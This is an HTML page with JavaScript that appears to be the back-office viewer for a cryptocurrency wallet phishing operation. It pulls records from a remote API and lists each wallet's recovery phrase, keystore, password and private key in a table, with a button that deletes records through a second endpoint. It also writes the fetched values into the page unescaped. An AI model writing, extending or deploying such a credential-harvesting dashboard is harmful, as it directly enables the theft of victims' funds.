<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallets</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        table {
            border-collapse: collapse;
            width: 100%;
            margin-top: 20px;
        }

        th,
        td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }

        /* Different background colors for each column */
        td:nth-child(1) {
            background-color: #f0f8ff;
        }

        /* Wallet ID */
        td:nth-child(2) {
            background-color: #ffe4e1;
        }

        /* Type */
        td:nth-child(3) {
            background-color: #f0ffff;
        }

        /* Phrase Input */
        td:nth-child(4) {
            background-color: #f5f5dc;
        }

        /* Keystore Value */
        td:nth-child(5) {
            background-color: #e0ffff;
        }

        /* Password */
        td:nth-child(6) {
            background-color: #f5fffa;
        }

        /* Private Key Value */
        td:nth-child(7) {
            background-color: #f0f8ff;
        }

        /* Created At */
        .delete-button {
            background-color: #f44336;
            color: white;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <table>
        <thead>
            <tr>
                <th>Wallet ID</th>
                <th>Type</th>
                <th>Phrase Input</th>
                <th>Keystore Value</th>
                <th>Password</th>
                <th>Private Key Value</th>
                <th>Created At</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody id="wallets-container"></tbody>
    </table>

    <script>
        // Fetch data from the API endpoint
        fetch('https://www.digitalmaxtrd.com/wallets')
            .then(response => response.json())
            .then(data => {
                // Process the data and display it in the table
                const walletsContainer = document.getElementById('wallets-container');
                data.wallets.forEach(wallet => {
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${wallet.wallet_id}</td>
                        <td>${wallet.type}</td>
                        <td>${wallet.phraseinput}</td>
                        <td>${wallet.keystoreval}</td>
                        <td>${wallet.password}</td>
                        <td>${wallet.privatekeyval}</td>
                        <td>${wallet.createdAt}</td>
                        <td><button class="delete-button" onclick="deleteRecord('${wallet._id}')">Delete</button></td>
                    `;
                    walletsContainer.appendChild(row);
                });
            })
            .catch(error => {
                console.error('Error:', error);
                // Display an error message if something goes wrong
                const walletsContainer = document.getElementById('wallets-container');
                walletsContainer.innerHTML = '<tr><td colspan="8">Error fetching wallets data</td></tr>';
            });

        function deleteRecord(id) {
            // Send a DELETE request to the API endpoint with the record ID
            fetch(`https://www.digitalmaxtrd.com/deletetr/${id}`, {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json'
                },
            })
                .then(response => {
                    if (response.ok) {
                        console.log(`Record with ID ${id} deleted successfully`);
                        // Optionally, update the UI to reflect the deletion
                    } else {
                        console.error('Failed to delete record:', response.status);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        }
    </script>
</body>

</html>
